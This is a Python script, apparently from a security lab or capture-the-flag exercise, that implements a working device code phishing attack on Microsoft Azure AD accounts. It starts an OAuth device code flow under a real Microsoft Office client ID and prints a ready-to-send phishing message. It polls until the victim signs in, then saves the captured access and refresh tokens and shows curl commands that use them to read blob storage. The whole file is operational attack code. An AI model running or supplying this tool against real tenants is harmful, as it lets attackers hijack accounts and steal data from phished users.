#!/usr/bin/env python3
"""
phish.py - Device Code Phishing Tool

Initiates an OAuth device code flow on behalf of a legitimate Microsoft app,
displays a realistic phishing message, polls Azure AD until the victim
authenticates, then prints the captured access token.

Usage:
  python3 phish.py --tenant <tenant_id_or_domain>

After the code is displayed, run victim_simulator.py in a second terminal
to automate the victim side of the attack.
"""

import argparse
import json
import sys
import time
import requests

# Microsoft Office desktop client — a real FOCI-member app ID.
# Tokens acquired here are accepted by most Microsoft APIs.
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
SCOPE = "https://storage.azure.com/user_impersonation offline_access openid profile"
TOKEN_PATH = "/tmp/dcp_token.json"


def initiate_flow(tenant: str) -> dict:
    r = requests.post(
        f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode",
        data={"client_id": CLIENT_ID, "scope": SCOPE},
        timeout=15,
    )
    r.raise_for_status()
    return r.json()


def poll_for_token(tenant: str, device_code: str, interval: int) -> dict:
    url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
    while True:
        time.sleep(interval)
        r = requests.post(
            url,
            data={
                "client_id": CLIENT_ID,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "device_code": device_code,
            },
            timeout=15,
        )
        data = r.json()
        if "access_token" in data:
            return data
        err = data.get("error", "")
        if err == "authorization_pending":
            sys.stdout.write(".")
            sys.stdout.flush()
            continue
        if err == "expired_token":
            print("\n[!] Device code expired. Re-run the tool.")
            sys.exit(1)
        print(f"\n[!] Unexpected error: {data}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(description="Device Code Phishing Tool")
    parser.add_argument("--tenant", required=True, help="Azure AD tenant ID or primary domain")
    parser.add_argument("--victim-username", default=None, dest="victim_username",
                        help="Victim's UPN (pre-fills the simulator command)")
    parser.add_argument("--victim-password", default=None, dest="victim_password",
                        help="Victim's password (pre-fills the simulator command)")
    args = parser.parse_args()

    print()
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║            DEVICE CODE PHISHING TOOL                        ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print()

    print("[*] Initiating device code flow...")
    flow = initiate_flow(args.tenant)

    user_code   = flow["user_code"]
    device_code = flow["device_code"]
    verify_uri  = flow["verification_uri"]
    interval    = flow.get("interval", 5)
    expires_in  = flow.get("expires_in", 900)

    print()
    print("┌──────────────────────────────────────────────────────────────┐")
    print("│                  ⚡  PHISHING MESSAGE  ⚡                    │")
    print("│                                                              │")
    print("│  Subject: Action Required — Verify Your Microsoft Account   │")
    print("│                                                              │")
    print("│  Your account requires re-verification. Visit:              │")
    print(f"│    {verify_uri:<58s}│")
    print("│                                                              │")
    print(f"│  Enter code:  {user_code:<47s}│")
    print("│                                                              │")
    print(f"│  Code expires in {expires_in // 60} minutes.                               │")
    print("└──────────────────────────────────────────────────────────────┘")
    print()
    victim_username = args.victim_username or "<victim_email>"
    victim_password = args.victim_password or "<victim_password>"
    print("[*] Waiting for victim to authenticate. Run in a second terminal:")
    print()
    print(f"    python3 victim_simulator.py \\")
    print(f"        --tenant   {args.tenant} \\")
    print(f"        --code     {user_code} \\")
    print(f"        --username {victim_username} \\")
    print(f"        --password '{victim_password}'")
    print()
    print("[*] Polling Azure AD for token", end="", flush=True)

    token_data = poll_for_token(args.tenant, device_code, interval)

    print()
    print()
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║  ✓  VICTIM AUTHENTICATED — TOKEN CAPTURED                   ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print()
    print(f"[+] Access token  : {token_data['access_token'][:80]}...")
    if "refresh_token" in token_data:
        print(f"[+] Refresh token : {token_data['refresh_token'][:80]}...")
    print()
    print(f"[+] Tokens saved  : {TOKEN_PATH}")

    with open(TOKEN_PATH, "w") as f:
        json.dump(token_data, f, indent=2)

    print()
    print("[*] Use the access token to call the Storage API:")
    print(f"    TOKEN=$(python3 -c \"import json; d=json.load(open('{TOKEN_PATH}')); print(d['access_token'])\")")
    print(f"    curl -H \"Authorization: Bearer $TOKEN\" \\")
    print(f"         -H \"x-ms-version: 2020-04-08\" \\")
    print(f"         \"https://<storage_account>.blob.core.windows.net/sensitive-data/flag.txt\"")
    print()


if __name__ == "__main__":
    main()
